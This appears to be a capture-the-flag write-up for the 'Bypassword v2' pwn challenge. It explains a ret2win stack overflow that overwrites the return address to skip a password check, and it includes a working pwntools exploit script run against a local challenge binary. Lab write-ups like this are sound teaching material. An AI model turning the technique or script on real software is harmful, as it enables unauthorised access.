---
title: Bypassword v2
slug: bypassword-v2
category: Pwn
author: Arman Abrahamyan
tags: [pwn, buffer-overflow, ret2win, stack-overflow]
description: A stack overflow ret2win: instead of passing the magic-value checks, overwrite the return address to land just after them, in the flag-reading code.
---

The `read_secret` function only prints the flag if it's called with the two arguments `param_1 == 0xdeadbeef` and `param_2 == 0x1337c0de`. In the disassembly you can see those two checks: `0xdeadbeef` is compared and a `JNZ` bails out to the "Unauthorized access detected" branch, then `0x1337c0de` is compared and a `JZ` jumps to `LAB_00401519` - the block that actually opens `./flag.txt` and prints it.
The key insight is that `0x401519` sits _after_ both comparisons. So instead of trying to satisfy the argument checks, the buffer overflow overwrites the saved return address with `0x401519`, dropping execution directly into the flag-reading code and skipping the guard entirely. When the vulnerable function returns, the CPU "returns" into the middle of `read_secret` at the point where the credentials have effectively already been accepted, and the flag gets read from disk and written to stdout - no correct password or magic values required.
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./bypassword_v2")
context.log_level = "debug"

FLAG_ADDR = 0x401519
OFFSET   = 40

payload  = b"A" * OFFSET
payload += p64(FLAG_ADDR)

p = process(elf.path)
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"Insert password: ", payload)
p.interactive()
```
